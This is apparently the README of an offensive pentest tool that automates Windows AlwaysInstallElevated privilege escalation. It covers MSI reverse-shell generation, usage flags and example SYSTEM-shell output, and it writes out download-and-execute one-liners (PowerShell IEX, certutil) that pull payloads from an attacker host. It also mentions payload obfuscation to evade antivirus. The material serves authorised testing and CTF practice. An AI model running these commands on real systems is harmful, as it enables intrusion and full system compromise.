# aie

> Automated exploitation script for the **AlwaysInstallElevated** Windows privilege escalation misconfiguration.

---

## ⚠️ Disclaimer

This tool is intended **exclusively for authorized security testing, CTF competitions, and educational purposes**. Using it against systems you do not own or have explicit written permission to test is **illegal** and punishable under computer crime laws in most jurisdictions (including the CFAA in the United States and equivalent legislation worldwide).

**The author assumes no liability for any misuse or damage caused by this tool. Use responsibly.**

---

## What is AlwaysInstallElevated?

`AlwaysInstallElevated` is a Windows Group Policy setting that, when enabled in both `HKLM` and `HKCU`, allows **any user** to install `.msi` packages with `NT AUTHORITY\SYSTEM` privileges — regardless of the user's own privilege level.

When both registry keys are set to `1`:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  ->  AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  ->  AlwaysInstallElevated = 1
```

A low-privileged user can craft a malicious MSI file and execute it via `msiexec`, obtaining a shell as `SYSTEM`.

---

## What does aie do?

`aie.sh` automates the entire exploitation workflow from a single command:

1. **Generates a PowerShell reverse shell** (`revshell_ps.ps1`) — interactive, line-buffered, with correct prompt and error handling.
2. **Generates four MSI payloads** using `msfvenom`:
   - `update_ps_x64.msi` — fetches and runs `revshell_ps.ps1` as SYSTEM (x64)
   - `update_ps_x86.msi` — fetches and runs `revshell_ps.ps1` as SYSTEM (x86)
   - `update_cmd_x64.msi` — raw `cmd.exe` reverse shell as SYSTEM (x64, no PS required)
   - `update_cmd_x86.msi` — raw `cmd.exe` reverse shell as SYSTEM (x86, no PS required)
3. **Generates two entry-point scripts** to run on the target:
   - `get-script.ps1` — PowerShell entry point
   - `get-script.bat` — Pure CMD entry point (no PowerShell required)
4. **Serves all files** via a Python HTTP server.
5. **Starts a listener** (`nc` by default, or `penelope` with `--penelope`) for the incoming reverse shell.
6. **Cleans up** all temporary files and stops the HTTP server automatically on exit.

### Entry point logic (both PS and CMD)

```
Check HKLM AlwaysInstallElevated == 1
Check HKCU AlwaysInstallElevated == 1
         │
         ├── Either is not 1 → abort, nothing downloaded or executed
         │
         └── Both are 1 → vulnerable, continue
                  │
                  ├── Detect OS architecture (x86 / x64)
                  │
                  ├── [PS only] Detect PowerShell availability
                  │       ├── PS available  → download update_ps_{arch}.msi
                  │       └── No PS         → download update_cmd_{arch}.msi
                  │
                  └── [CMD only] → download update_cmd_{arch}.msi
                           │
                           └── msiexec /quiet /qn → SYSTEM → reverse shell
```

---

## Requirements

| Dependency | Purpose | Notes |
|---|---|---|
| `msfvenom` | MSI payload generation | Part of [Metasploit Framework](https://github.com/rapid7/metasploit-framework) |
| `python3` | HTTP server to serve payloads | Built-in `http.server` module |
| `nc` (netcat) | Reverse shell listener (default) | Any variant: `ncat`, `openbsd-netcat`, etc. |
| `penelope` | Reverse shell listener (optional) | Required only with `--penelope`. [brightio/penelope](https://github.com/brightio/penelope) |
| `iconv` | Base64-encodes the PS fetch command | Standard on all Linux distros |
| `base64` | Base64 encoding | GNU coreutils |

All dependencies except `penelope` are pre-installed on **Kali Linux** and **Parrot OS** out of the box.

---

## Installation

```bash
git clone https://github.com/136avm/Auto-Always-Install-Elevated
cd Auto-Always-Install-Elevated
chmod +x aie.sh
```

---

## Usage

```
Usage: aie.sh -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>] [--penelope]

  -i           Your attacker machine IP (LHOST)
  -p           Port to receive the reverse shell on (LPORT)
  -w           HTTP server port used to serve the payloads (default: 8005)
  --penelope   Use penelope as the reverse shell listener instead of nc
               (penelope must be installed and in PATH)
  -h           Show this help message
```

### Basic usage (nc listener)

```bash
./aie.sh -i <LHOST> -p <LPORT>
```

### With penelope as listener

```bash
./aie.sh -i <LHOST> -p <LPORT> --penelope
```

`--penelope` can be placed anywhere in the argument list:

```bash
./aie.sh --penelope -i <LHOST> -p <LPORT> -w 8080
```

### Custom HTTP port

```bash
./aie.sh -i <LHOST> -p <LPORT> -w 8080
```

---

## Listener modes

| Flag | Listener | Notes |
|---|---|---|
| *(none)* | `nc -lvnp <LPORT>` | Default. Works out of the box on any Kali/Parrot. |
| `--penelope` | `penelope -p <LPORT>` | Provides an upgraded shell (auto-completion, file transfer, session management). Requires [penelope](https://github.com/brightio/penelope) installed. |

If `--penelope` is specified but `penelope` is not found in `PATH`, the script exits early with an error before generating any payload.

---

## Running on the target

Once `aie.sh` is running, copy the command it prints and execute it on the target from your existing low-privileged shell.

### With PowerShell available

```powershell
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8005/get-script.ps1')"
```

What happens on the target:
1. Fetches and runs `get-script.ps1` in memory (no file written for the PS1).
2. Verifies both `AlwaysInstallElevated` registry keys — aborts if either is not `1`.
3. Detects OS architecture (`x86` / `x64`).
4. Detects PowerShell availability and selects the correct MSI.
5. Downloads the MSI with `certutil` to `%TEMP%`.
6. Runs it via `msiexec /quiet /qn` → SYSTEM shell connects back.

### Without PowerShell (pure CMD)

```cmd
certutil -urlcache -split -f "http://<LHOST>:8005/get-script.bat" "%TEMP%\get-script.bat" && "%TEMP%\get-script.bat"
```

What happens on the target:
1. Downloads `get-script.bat` to `%TEMP%` via `certutil`.
2. Verifies both `AlwaysInstallElevated` registry keys with `reg query` — aborts if either is not `0x1`.
3. Detects OS architecture via `%PROCESSOR_ARCHITECTURE%` and `%PROCESSOR_ARCHITEW6432%`.
4. Downloads the correct CMD MSI with `certutil`.
5. Runs it via `msiexec /quiet /qn` → SYSTEM shell connects back.

---

## Verifying the vulnerability manually

Before running the tool, you can confirm the target is vulnerable with:

```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

Both must return `0x1`. If either key is missing or set to `0`, the target is **not vulnerable**.

---

## Architecture detection

`aie.sh` generates payloads for both `x86` and `x64` architectures. The entry point scripts detect the target OS architecture at runtime:

| Method | Used in | Detects |
|---|---|---|
| `[Environment]::Is64BitOperatingSystem` | `get-script.ps1` | True OS bitness (ignores WOW64 process) |
| `%PROCESSOR_ARCHITEW6432%` (defined?) | `get-script.bat` | x86 process running on x64 OS (WOW64) |
| `%PROCESSOR_ARCHITECTURE% == AMD64` | `get-script.bat` | Native x64 process |
| `%PROCESSOR_ARCHITECTURE% == x86` | `get-script.bat` | Native x86 process or WOW64 (fallback) |

> **Why does the BAT check `PROCESSOR_ARCHITEW6432` first?**
> On a 64-bit Windows, a 32-bit `cmd.exe` process (WOW64) sees `PROCESSOR_ARCHITECTURE=x86`, which would incorrectly trigger the x86 MSI. `PROCESSOR_ARCHITEW6432` is only defined in this WOW64 scenario and always contains the *true* OS architecture (`AMD64`), so it is checked first.

---

## Compatibility

| Target | Supported |
|---|---|
| Windows XP / Server 2003 | ✅ (x86 payload) |
| Windows 7 / Server 2008 R2 | ✅ |
| Windows 10 / Server 2016+ | ✅ |
| Windows 11 / Server 2022 | ✅ |
| Windows with PowerShell | ✅ (PS reverse shell) |
| Windows without PowerShell | ✅ (CMD fallback via .bat) |
| x86 OS | ✅ (auto-detected) |
| x64 OS | ✅ (auto-detected) |

> **Note on AV/EDR:** `msfvenom` raw shellcode payloads are typically detected by Windows Defender on modern, fully-patched systems. In CTF and lab environments Defender is usually disabled. For real engagements, you would need to use a custom or obfuscated payload.

---

## Example output

### Default (nc)

```
./aie.sh -i 10.10.14.27 -p 4444
```

```
  ╔══════════════════════════════════════════════════════╗
  ║              AlwaysInstallElevated → SYSTEM          ║
  ║                                                      ║
  ║  LHOST    : 10.10.14.27                              ║
  ║  LPORT    : 4444  (reverse shell)                    ║
  ║  HTTP     : 8005                                     ║
  ║  ARCH     : auto-detect (x86 + x64)                  ║
  ║  LISTENER : nc                                       ║
  ╚══════════════════════════════════════════════════════╝

[*] Starting listener on port 4444 (nc)...
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.X] 50212
PS C:\WINDOWS\system32> whoami
nt authority\system
```

### With penelope

```
./aie.sh -i 10.10.14.27 -p 4444 --penelope
```

```
  ╔══════════════════════════════════════════════════════╗
  ║              AlwaysInstallElevated → SYSTEM          ║
  ║                                                      ║
  ║  LHOST    : 10.10.14.27                              ║
  ║  LPORT    : 4444  (reverse shell)                    ║
  ║  HTTP     : 8005                                     ║
  ║  ARCH     : auto-detect (x86 + x64)                  ║
  ║  LISTENER : penelope                                 ║
  ╚══════════════════════════════════════════════════════╝

[*] Starting listener on port 4444 (penelope)...
[+] Listening for reverse shells on 0.0.0.0:4444
[+] [New Reverse Shell] => 10.10.10.X  😍 Session ID <1>
PS C:\WINDOWS\system32> whoami
nt authority\system
```

---

## How it works internally

```
aie.sh
  │
  ├── msfvenom × 4          → 4 MSI payloads (PS/CMD × x64/x86)
  ├── revshell_ps.ps1        → TCP socket loop, line-buffered, prompt-aware
  ├── get-script.ps1         → PS entry point (registry + arch + PS detection)
  ├── get-script.bat         → CMD entry point (registry + arch detection)
  ├── python3 http.server    → Serves all files on LPORT_HTTP
  └── nc / penelope          → Waits for incoming shell (--penelope to switch)
        │
        └── On EXIT/INT/TERM → kills HTTP server + removes /tmp/aie.*
```

---

## Legal & ethical use

This tool is provided for:

- **CTF competitions** (Hack The Box, TryHackMe, VulnHub, etc.)
- **Authorized penetration testing** (with explicit written permission from the system owner)
- **Security research and education** in isolated lab environments

Any use against systems without prior written authorization is **strictly prohibited** and may result in criminal prosecution. Always operate within the scope of your engagement and applicable laws.

---

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

---

## License

[MIT](LICENSE)
